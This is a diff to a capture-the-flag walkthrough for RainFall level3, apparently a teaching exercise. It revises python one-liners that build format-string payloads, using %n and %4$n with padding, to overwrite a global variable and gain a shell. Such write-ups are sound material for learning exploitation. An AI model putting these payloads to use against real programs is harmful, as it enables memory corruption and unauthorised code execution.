@@ -40,7 +40,7 @@ level3
 *	We will be using the `%n` modifier which we can specify the address like so `%[address]$n`
 *	Now let's not forget the little endian rule with the address of `m` and try to replace `aaaa` with it
 	```console
-	level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08 %x %x %x %x"' > /tmp/test
+	level3@RainFall:~$ python -c 'print "\x08\x04\x98\x8c"[::-1] + "%x "*4' > /tmp/test
 	level3@RainFall:~$ cat /tmp/test | ./level3
 	� 200 b7fd1ac0 b7ff37d0 804988c
 	```
@@ -51,7 +51,7 @@ level3
 	not too hard here
 *	We now got everything we need, let's and this level :
 	```console
-	level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "a" * 60 + "%4$n"' > /tmp/test
+	level3@RainFall:~$ python -c 'print "\x08\x04\x98\x8c"[::-1] + "a" * 60 + "%4$n"' > /tmp/test
 	level3@RainFall:~$ cat /tmp/test - | ./level3
 	�aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 	Wait what?!
@@ -63,10 +63,10 @@ level3
 *	There are two other ways to do this :
 	-	Use the bytes printed with the `%x` to add bytes to the count without random char
 		```console
-		level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "a" * 41 + "%x%x%x$n"' > /tmp/test
+		level3@RainFall:~$ python -c 'print "\x08\x04\x98\x8c"[::-1] + "a" * 41 + "%x%x%x%n"' > /tmp/test
 		```
 		Those flags are 19 bytes heavy when we print them `(200 b7fd1ac0 b7ff37d0) -> 19` so we end up adding only 41 bytes.
 	-	And the last is to use the `%d` specifier, from what I understood, it shares the same `count` as the `%n` specifier and so it "prints" the char needed to obtain the number you want without really printing it (avoiding space limitations and using my brain to count the bytes)
 		```console
-		level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "%d64$4$n"' > /tmp/test
+		level3@RainFall:~$ python -c 'print "\x08\x04\x98\x8c"[::-1] + "%60d%4$n"' > /tmp/test
 		```
